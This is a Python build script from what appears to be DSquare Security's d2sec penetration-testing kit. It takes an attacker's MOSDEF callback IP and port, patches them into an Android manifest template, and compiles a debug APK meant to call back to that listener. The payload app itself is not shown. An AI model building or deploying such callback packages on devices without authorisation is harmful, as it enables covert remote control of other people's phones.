#! /usr/bin/env python
# -*- coding: UTF-8  -*-

# Copyright (c) 2007-2011 DSquare Security, LLC
# All rights reserved.

import os, sys, shutil

src = 'd2sec_apk'

def create_android_manifest(mosdefip, mosdefport):
  manifest = os.path.join(src, 'AndroidManifest.xml')
  print '[*] copying %s to ./AndroidManifest.xml.orig' % manifest 
  try:
    shutil.copyfile(manifest, './AndroidManifest.xml.orig')
  except Exception, e:
    print '[-] error : %s' % e
    return 1
  print '[*] creating AndroidManifest.xml'
  try:
    m = open(manifest, "r")
    xml = m.readlines()
    m.close()
  except Exception, e:
    print '[-] error : %s' % e
    return 1
  m = open(manifest, "w")
  for line in xml:
    if line.find('MOSDEFIP') > -1: 
      line = line.replace('MOSDEFIP', mosdefip)
    if line.find('MOSDEFPORT') > -1: 
      line = line.replace('MOSDEFPORT', mosdefport)
    m.write(line)
  m.close() 
  return 0

def compile_apk(antpath):
  os.chdir(src)
  os.system('%s debug' % antpath)
  os.chdir('..')
  shutil.copyfile(os.path.join(src, 'bin/d2sec_apk-debug.apk'), './d2sec_apk-debug.apk')
  print '[!] Android package d2sec_apk-debug.apk can be installed ...\n'
  return

if __name__ == "__main__":
  antpath = mosdefip = mosdefport = ''
  print 'd2sec_apk (c) 2007-2011 DSquare Security'
  print 'See README for more informations ...\n'
  antpath = raw_input('[+] ant binary pathname : ')
  mosdefip = raw_input('[+] mosdef callback ip : ')
  mosdefport = raw_input('[+] mosdef call port : ')
  i = create_android_manifest( mosdefip, mosdefport)
  if i:
    sys.exit(0)
  compile_apk(antpath)
